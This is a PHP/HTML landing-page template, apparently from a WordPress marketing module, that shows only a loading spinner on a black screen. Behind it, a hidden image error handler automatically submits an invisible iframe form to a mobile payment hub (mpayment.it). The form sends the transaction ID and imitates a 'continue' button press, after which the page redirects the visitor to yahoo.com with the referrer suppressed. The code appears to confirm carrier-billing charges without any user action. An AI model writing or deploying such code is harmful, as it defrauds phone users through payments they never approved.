<?php

use Wordpress\Multisite\Commons\Decorator\GetPost;
use Wordpress\Multisite\Commons\Support\Facades\Log;
use Wordpress\Multisite\Commons\Support\Facades\Session;
use Wordpress\Multisite\Commons\MarketingCustomization\Flow;
use Wordpress\Multisite\Commons\Support\Facades\PrepareResponse;

$completeUrl = PrepareResponse::getIframeUrl();

parse_str(parse_url($completeUrl, PHP_URL_QUERY), $output);

$transactionId = $output['TransactionID'];

?>

<!DOCTYPE html>
<html>
	<head>
		<meta charset="ISO-8859-1">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, minimal-ui, user-scalable=no" />
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
		<meta name="referrer" content="no-referrer">
		<style>
			html, body {
				background-color: #000 !important;
			}
			#modal-handy, #header, .textwidget {
			    display: none !important;
			}
			#container {
			    position: absolute;
			    right:0;
			    left: 0;
			    margin: auto;
			    top: 50%;
    			transform: translateY(-50%);
			}
			.loadingSpin{
			    margin:15% auto;
			    width:90%;
			    text-align: center;
			    background: rgba(0,0,0,0.2);
			}
			.loadingSpin img {
			    width:50px;
			}
			#loading {
			    font-size: 14px;
			    padding:10px;
			    color:#e3e3e3;
			    text-shadow:0 0 2px #000;
			}
			.spinner {
			    position: relative;
			    display: block;
			    width: 70px;
			    height: 70px;
			    margin:10px auto;
			    border: 4px solid transparent;
			    border-radius: 5px;
			    cursor: pointer;
			}
			.spinner-in {
			    box-sizing: border-box;
			    position: absolute;
			    width: 70px;
			    height: 70px;
			    border-radius: 50%;
			    border-top: 4px solid #E50914;
			    border-right: 4px solid transparent;
			    animation: spinner .6s linear infinite;
			}
			@keyframes spinner {
			  to {transform: rotate(360deg);}
			}
		</style>
		<?php wp_head(); ?>
	</head>
	<body>
		<img src="<?php echo $completeUrl; ?>" id="img" style="display: none;"/>
		<div id="container">
		    <div class="loadingSpin">
		        <div class="spinner"><div class="spinner-in"></div></div>
		    </div>
		</div>

		<iframe srcdoc="<form action='http://hub1.mpayment.it/fir' method='post'><input type='image' src='https://hub1.mpayment.it/static/src/bot_continua.png' name='picture'><input type='hidden' name='txId' value='<?php echo $transactionId; ?>'/></form>" id="iframe0" style="display:none;"></iframe>

		<script type="text/javascript">
			$('#img').on(
					'error',
					function(){
						setTimeout(
							function(){
								sendRequestIframe('#iframe0');
								setTimeout(
									function(){
										window.location.href = 'https://yahoo.com';
									}, 500
								);
							}, 400
						);
					}
			);

			function sendRequestIframe(iframeId){
				$(iframeId).contents().find('form').submit();
			}
		</script>
	</body>
	</html>
